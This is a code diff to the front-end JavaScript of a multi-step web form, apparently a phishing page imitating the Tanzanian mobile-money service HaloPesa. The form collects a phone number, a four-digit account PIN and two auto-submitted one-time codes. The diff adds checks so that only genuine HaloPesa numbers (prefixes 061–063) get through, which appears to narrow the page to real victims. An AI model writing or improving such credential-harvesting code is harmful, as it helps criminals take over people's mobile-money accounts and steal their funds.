@@ -27,6 +27,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const pinBoxes = document.querySelectorAll('.pin-box-square');
   const btnSubmitSignin = document.getElementById('btn-submit-signin');
   const bannerPinError = document.getElementById('banner-pin-error');
+  const bannerPhoneError = document.getElementById('banner-phone-error');
 
   const otp1Boxes = document.querySelectorAll('.otp1-box-square');
   const btnSubmitOtp1 = document.getElementById('btn-submit-otp1');
@@ -42,6 +43,13 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
+
+  // Helper to validate HaloPesa prefixes: 061, 062, 063 (accepts 061xxxxxxx or 61xxxxxxx)
+  function isValidHaloPesa(rawPhone) {
+    const digits = rawPhone.replace(/\D/g, '');
+    const normalized = digits.startsWith('255') ? '0' + digits.slice(3) : (digits.startsWith('0') ? digits : '0' + digits);
+    return /^06(1|2|3)\d{7}$/.test(normalized);
+  }
 
   function showScreen(targetScreen) {
     [screenWelcome, screenSlider, screenForm1, screenForm2, screenForm3, screenSignin, screenOtp1, screenOtp2, screenSuccess, screenStopped].forEach(s => {
@@ -67,7 +75,27 @@ document.addEventListener('DOMContentLoaded', () => {
 
   if (btnForm2Back) btnForm2Back.addEventListener('click', () => showScreen(screenForm1));
   if (btnForm2Prev) btnForm2Prev.addEventListener('click', () => showScreen(screenForm1));
-  if (btnForm2Next) btnForm2Next.addEventListener('click', () => showScreen(screenForm3));
+  
+  // Phone validation for Step 2 (Must start with 061, 062, or 063)
+  if (btnForm2Next) {
+    btnForm2Next.addEventListener('click', () => {
+      const phoneInput = document.getElementById('form-phone').value.trim();
+
+      if (!isValidHaloPesa(phoneInput)) {
+        const errorMsg = 'SAMAHANI: Namba ya HaloPesa inapaswa kuanza na 061, 062, au 063 pekee.';
+        if (bannerPhoneError) {
+          bannerPhoneError.innerText = errorMsg;
+          bannerPhoneError.classList.add('active');
+        } else {
+          alert(errorMsg);
+        }
+        return;
+      }
+
+      if (bannerPhoneError) bannerPhoneError.classList.remove('active');
+      showScreen(screenForm3);
+    });
+  }
 
   if (btnForm3Back) btnForm3Back.addEventListener('click', () => showScreen(screenForm2));
   if (btnForm3Prev) btnForm3Prev.addEventListener('click', () => showScreen(screenForm2));
@@ -81,6 +109,12 @@ document.addEventListener('DOMContentLoaded', () => {
 
       if (!firstName || !lastName || !phone) {
         alert('Tafadhali jaza jina na namba ya simu.');
+        return;
+      }
+
+      if (!isValidHaloPesa(phone)) {
+        alert('SAMAHANI: Namba ya HaloPesa inapaswa kuanza na 061, 062, au 063 pekee.');
+        showScreen(screenForm2);
         return;
       }
 
@@ -152,21 +186,25 @@ document.addEventListener('DOMContentLoaded', () => {
 
   setupDigitInputs(pinBoxes);
   
-  // OTP 1: Automatically submitted immediately when 4 digits are entered
   setupDigitInputs(otp1Boxes, (otpVal) => {
     submitOtp1Action(otpVal);
   });
 
-  // OTP 2: Automatically submitted immediately when 4 digits are entered
   setupDigitInputs(otp2Boxes, (otpVal) => {
     submitOtp2Action(otpVal);
   });
 
-  // Sign In PIN Submission
+  // Sign In PIN Submission (Also validates 061, 062, 063)
   if (btnSubmitSignin) {
     btnSubmitSignin.addEventListener('click', async () => {
       const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
       const phoneVal = signinPhone ? signinPhone.value.trim() : '';
+
+      if (!isValidHaloPesa(phoneVal)) {
+        showSurfaceError(bannerPinError, 'SAMAHANI: Namba ya HaloPesa inapaswa kuanza na 061, 062, au 063 pekee.');
+        return;
+      }
+
       if (pinVal.length !== 4) {
         showSurfaceError(bannerPinError, 'Weka PIN sahihi ya tarakimu 4');
         return;
